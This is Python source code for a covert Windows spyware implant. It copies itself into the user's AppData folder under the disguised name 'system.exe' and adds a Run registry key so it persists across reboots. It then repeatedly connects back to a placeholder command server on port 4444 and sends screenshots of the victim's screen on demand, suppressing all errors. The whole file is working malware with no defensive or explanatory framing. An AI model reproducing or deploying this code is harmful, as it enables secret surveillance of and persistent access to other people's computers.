import socket
import os
import shutil
import sys
import random
import string
import subprocess
import winreg
from time import sleep
from mss import mss

SERVER_IP = "srv_ip"
PORT = 4444

# create random Windows subdir for screenshot temp
def random_foldername(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

TEMP_DIR = os.path.join("C:\\Windows", random_foldername())
try:
    os.makedirs(TEMP_DIR, exist_ok=True)
except:
    TEMP_DIR = os.environ["TEMP"]

def take_screenshot():
    path = os.path.join(TEMP_DIR, "sc.png")
    with mss() as sct:
        sct.shot(output=path)
    with open(path, "rb") as f:
        data = f.read()
    os.remove(path)
    return data

# auto-copy to %APPDATA%\SystemWin\system.exe
def setup_persistence():
    target_dir = os.path.join(os.environ["APPDATA"], "SystemWin")
    target_path = os.path.join(target_dir, "system.exe")

    # check if we're already running from the target path
    if not os.path.exists(target_path) or os.path.abspath(sys.executable) != os.path.abspath(target_path):
        try:
            os.makedirs(target_dir, exist_ok=True)
            shutil.copy2(sys.executable, target_path)

            # registry persistence
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Run",
                                 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SystemWin", 0, winreg.REG_SZ, target_path)
            winreg.CloseKey(key)

            # Launch copied version and exit current
            subprocess.Popen([target_path], shell=False)
            sys.exit(0)
        except Exception as e:
            pass  # silently fail

def connect():
    while True:
        try:
            s = socket.socket()
            s.connect((SERVER_IP, PORT))

            while True:
                command = s.recv(1024).decode()
                if command == "screenshot":
                    img = take_screenshot()
                    s.sendall(len(img).to_bytes(4, 'big'))
                    s.sendall(img)
                elif command == "exit":
                    break
        except Exception:
            sleep(5)
            continue

if __name__ == "__main__":
    setup_persistence()
    connect()
